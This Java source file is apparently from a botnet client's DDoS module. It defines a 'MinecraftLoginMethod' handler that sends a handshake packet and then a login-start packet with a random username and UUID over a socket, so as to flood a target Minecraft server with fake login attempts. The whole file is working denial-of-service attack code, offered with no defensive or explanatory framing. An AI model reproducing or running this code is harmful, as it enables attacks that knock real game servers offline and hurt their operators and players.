package dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.MinecraftMethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.State;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.security.SecureRandom;
import java.util.UUID;

public class MinecraftLoginMethod extends MinecraftMethodHandler {
   private ByteBuffer buffer;
   private final SecureRandom random = new SecureRandom();

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IllegalArgumentException {
      super.init(protocol, address, host, options);
      this.buffer = this.createHandshakePacket(this.protocolVersion, this.host, this.port, State.LOGIN);
   }

   @Override
   public void handle(SocketChannel channel) throws IOException {
      channel.write(this.buffer.duplicate());
      channel.write(this.createLoginStartPacket(new BigInteger(64, this.random).toString(16), UUID.randomUUID()));
   }
}
